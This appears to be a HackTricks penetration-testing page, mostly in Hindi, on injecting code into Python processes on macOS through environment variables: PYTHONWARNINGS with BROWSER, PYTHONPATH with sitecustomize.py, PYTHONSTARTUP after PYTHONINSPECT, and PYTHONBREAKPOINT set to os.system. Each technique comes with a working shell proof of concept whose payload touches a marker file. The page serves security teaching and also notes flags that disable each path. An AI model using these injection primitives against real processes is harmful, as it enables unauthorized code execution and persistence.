# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` और `BROWSER` environment variables के ज़रिए

अगर attacker किसी Python process के environment को नियंत्रित कर सकता है, तो `PYTHONWARNINGS` और `BROWSER` का संयोजन crafted warning option को process करते समय Python द्वारा `antigravity` module import करने पर command execution trigger कर सकता है। यह technique `antigravity` द्वारा Python के `webbrowser` module से URL खोलने पर निर्भर करती है, जो `BROWSER` environment variable का उपयोग करता है।<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## `PYTHONPATH` और `sitecustomize.py` के ज़रिए

सामान्य startup के दौरान Python का `site` module, site-विशिष्ट paths जोड़ता है और फिर `sitecustomize` नाम के module को import करने की कोशिश करता है। `PYTHONPATH` में सबसे पहले ऐसा directory रखकर जिसे attacker पढ़ सकता हो, process environment को नियंत्रित करने वाला attacker target script से पहले payload import करवा सकता है। `-S` flag automatic `site` initialization को बंद करता है, जबकि isolated mode (`-I`) `PYTHONPATH` को अनदेखा करता है और `-s` तथा `-E` को लागू करता है।<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

एक inherited `PYTHONPATH` के बजाय writable user site के ज़रिए persistence के लिए, देखें [Python `.pth`, `.start`, और `usercustomize` startup files](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## किसी script के बाद `PYTHONINSPECT` और `PYTHONSTARTUP` के ज़रिए

CPython 3.13+ पर, `PYTHONINSPECT=1` के साथ launch की गई script पूरी होने पर interactive session में प्रवेश करती है। अगर standard input एक terminal है और PyREPL उपलब्ध है, तो यह session target script के **बाद** और prompt से पहले, `PYTHONSTARTUP` द्वारा निर्दिष्ट file को execute करता है। इसलिए, inherited दोनों variables और पढ़ी जा सकने वाली startup file को नियंत्रित करने वाला attacker, script में बदलाव किए बिना target process में code चला सकता है। यह post-script trigger है, सामान्य startup hook नहीं।<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

यह chain पुराने CPython versions में, non-terminal standard input के साथ, या जब `PYTHONBREAKPOINT` basic REPL को बाध्य करता है, startup file execute नहीं करती। `-E` और `-I` `PYTHON*` variables को अनदेखा करते हैं। इस path पर निर्भर रहने से पहले actual interpreter और terminal context जाँचें।<sup>[[3]](#references)[[5]](#references)</sup>

## `PYTHONBREAKPOINT` के माध्यम से

Python 3.7 (PEP 553) से, built-in `breakpoint()` उस target को import और call करता है जिस पर `sys.breakpointhook` इंगित करता है; यह target **`PYTHONBREAKPOINT`** environment variable (`package.module.callable`) से लिया जाता है। Named module को import करना और callable को call करना—दोनों debugger के सामान्य रूप से दिखाई देने से पहले होते हैं। इसलिए, जिस process में `breakpoint()` तक पहुँचा जाता है (जैसा कि maintenance/debug scripts में आम है और कभी-कभी production paths में भी रह जाता है), उसके environment को नियंत्रित करने वाले हमलावर को code execution मिल जाता है।<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

`PYTHONWARNINGS`/`PYTHONPATH` के विपरीत, इसके लिए target को वास्तव में `breakpoint()` call तक पहुंचना ज़रूरी है, लेकिन यह named module के केवल **import side effects** के ज़रिए भी काम करता है (इसे किसी भी importable module पर point करें—उदाहरण के लिए, ऐसा module जिसे `PYTHONPATH` में सबसे पहले रखा गया हो—जिसके top level पर code चलता हो)। `PYTHONBREAKPOINT=0` इस hook को पूरी तरह disable कर देता है।

## References

- [1] [Environment Variables के साथ Hacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — साइट-विशिष्ट configuration hook](https://docs.python.org/3/library/site.html)
- [3] [Python कमांड-लाइन और environment](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Built-in breakpoint() और PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [CPython interpreter REPL dispatch (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [CPython PyREPL startup-file execution (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
